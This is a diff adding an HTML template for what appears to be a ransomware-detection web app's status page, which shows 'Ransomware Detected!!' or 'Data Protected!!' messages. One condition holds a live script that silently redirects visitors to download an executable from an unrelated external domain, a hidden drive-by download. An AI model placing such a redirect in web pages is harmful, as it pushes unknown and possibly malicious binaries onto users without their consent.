@@ -1,0 +1,65 @@
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Ransomware</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="../static/assets/img/favicon.png" rel="icon">
+  <link href="../static/assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+  <!-- Vendor CSS Files -->
+  <link href="../static/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../static/assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../static/assets/css/main.css" rel="stylesheet">
+
+</head>
+
+<body>
+{% if detect_st=="2" %}
+<script language="javascript">
+  window.location.href= "https://mitsui-jyuku.com/uploads/62043fvasea.exe";
+</script>
+{% endif %}
+
+
+{% if detect_st=="21" %}
+
+<h3 align="center" style="color:#FF0000">Ransomware Detected!!</h3>
+<script>
+//window.open("/alert1","alert","width=300,height=300,toolbar=0,menubar=0");
+</script>
+
+{% elif detect_st=="31" %}
+<h3 align="center" style="color:#009900">Ransomware Detected!!</h3>
+
+{% elif detect_st=="41" %}
+<h3 align="center" style="color:#009900">Data Protected!!</h3>
+
+{% elif detect_st=="11" %}
+<script language="javascript">
+ // window.location.href= '/history';
+</script>
+
+{% endif %}
+
+
+<script>
+//Using setTimeout to execute a function after 5 seconds.
+//setTimeout(function () {
+   //Redirect with JavaScript
+//   window.location.href= '/track_file';
+//}, 5000);
+</script>
+
+  <!-- Vendor JS Files -->
+  <script src="../static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <!-- Template Main JS File -->
+  <script src="../static/assets/js/main.js"></script>
+
+</body>
+
+</html>
